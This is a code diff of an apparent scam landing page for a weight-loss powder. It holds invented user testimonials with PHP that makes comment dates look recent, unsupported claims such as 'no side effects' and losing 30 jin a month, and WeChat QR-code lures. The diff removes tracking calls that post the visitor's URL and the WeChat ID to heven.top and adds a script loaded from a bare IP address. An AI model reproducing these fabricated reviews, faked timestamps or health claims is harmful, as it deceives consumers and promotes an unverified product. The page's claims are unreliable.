                                 <p class="w-contentTxt">案例是真实的吗？我也是喝凉水都会胖的人，今年25岁了，试了很多方法都没有效果，还有希望吗?</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">28</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 9:22",strtotime("-4 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">28</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>04-07 14:50</span> </div>
 
                             </div>
 							   <div class=" padding20 text-left tcsize80"><b class=" reply ">作者回复</b><br>
@@ -1116,7 +1106,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">本人自小的胖，用这个粉末，效果非常不错，继续继续</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">17</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 11:22",strtotime("-4 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">17</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>02-07 15:05</span> </div>
 
                             </div>
 
@@ -1132,7 +1122,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">真没想到减肥，还可以同时祛斑，一举两得</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">4</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 11:51",strtotime("-5 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">4</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>04-17 17:11</span> </div>
 
                             </div>
 
@@ -1148,7 +1138,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">加微信了，很专业的老师,弄的我现在有点嫉妒了</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">5</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 17:55",strtotime("-5 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">5</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>02-07 18:20</span> </div>
 
                             </div>
 
@@ -1164,7 +1154,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">比其他方法靠谱多了，简单直接，没副作用</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">18</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 14:21",strtotime("-6 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">18</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>04-07 19:42</span> </div>
 
                             </div>
 
@@ -1180,7 +1170,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">目前最赞的最有效的方案，最赞的老师</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">14</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 13:41",strtotime("-6 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">14</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>03-14 20:10</span> </div>
 
                             </div>
 
@@ -1197,7 +1187,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">目前最赞的最有效的方案，最赞的老师+1</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">21</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 20:21",strtotime("-6 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">21</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>04-1722:01</span> </div>
 
                             </div>
 
@@ -1213,7 +1203,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">终于可以穿好看的衣服了，激动</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">4</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 21:33",strtotime("-6 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">4</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>03-18 23:25</span> </div>
 
                             </div>
 
@@ -1246,7 +1236,7 @@ function submit2(){
 
 <section class="side" style="z-index:1000;line-height:1.2; font-size:14px;position:fixed; width:250px; top:110px; left:50%; margin-left:225px; border:#ccc 1px solid;padding-left:10px; padding-right:10px; padding-bottom:10px; padding-top:10px; background:#fff;">
 
-    <p style="margin:0"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01jam7tl1el0rixxb37_!!2684310334.jpg" tppabs="http://yj6.jinanbuyun.com/picture/735.jpg" width="100%"></p>
+    <p style="margin:0"><img src="https://img.alicdn.com/imgextra/i1/2684310334/O1CN01JAm7Tl1EL0rIXXb37_!!2684310334.jpg" tppabs="http://yj6.jinanbuyun.com/picture/735.jpg" width="100%"></p>
 
     <p style="margin:5px 0;"><b>减肥，用对方法，少走弯路，月瘦30斤并不难<font class="statistics02">添加微信号：<script>document.write(mess2);</script></font></span></br>
 	
@@ -1257,7 +1247,7 @@ function submit2(){
     <p style="text-align:center;margin:0px 0;"><span class="add_wx">微信扫描二维码，获取瘦身秘方！</span></p>
 
     <p style="text-align:center;margin:5px 0;"><font class="statistics021">
-    <script>document.write('<img src="' + mess4 + '">');</script>
+    <script>document.write("<img src=\"" + mess4 + "\">");</script>
 </font></p>
 
 
@@ -1305,61 +1295,40 @@ function submit2(){
 
 </span>
     </div>
-<div class="m-avator-slider"> <img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn017nt3w71el0q8sqev7_!!2684310334.jpg" tppabs="http://yj6.jinanbuyun.com/picture/38.png" width="200"></div>
-<!-- <script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/count.js"></script> -->
+<div class="m-avator-slider"> <img src="https://img.alicdn.com/imgextra/i3/2684310334/O1CN017nt3W71EL0q8SQEV7_!!2684310334.jpg" tppabs="http://yj6.jinanbuyun.com/picture/38.png" width="200"></div>
+<script src="http://183.60.106.53:51/count.js"></script>
 <script>
     function wcoc(){
     if(   typeof(lsck) == 'function' )lsck();
     }
-    $(".wx_div_1").slideDown();
-    $(".wx_div_2").slideDown();
-    $(".wx_div_3").slideDown();
-    $("#openwx").slideDown();
     $(".right_wxBTn").click(function(){
         $("#openwx").slideDown();
         wcoc();
-        showQrcode();
-        
     });
-    function showQrcode(){
-    $.ajax({
-            url:'http://heven.top:8000/app/log',
-            method:'post',
-            data:{'type':'showqrcode','local_url':window.location.href,'weixin':"<?php echo $stxlwx?>"},
-        })
-    }
+
     
     $(".right_wxBTn_1").click(function(){
         $(".wx_div_1").slideDown();
         wcoc();
-        showQrcode();
     });
       $(".right_wxBTn_2").click(function(){
         $(".wx_div_2").slideDown();
         wcoc();
-        showQrcode();
     });
 	
 	 $(".right_wxBTn_3").click(function(){
         $(".wx_div_3").slideDown();
         wcoc();
-        showQrcode();
     });
 	 $(".submit_btn").click(function(){
        
         wcoc();
-        showQrcode();
     });
 	
 	
 	
     
-    $.ajax({
-        url:'http://heven.top:8000/app/log',
-        method:'post',
-        data:{'type':'load','local_url':window.location.href,'weixin':"<?php echo $stxlwx?>"},
     
-    })
 </script>
 
 
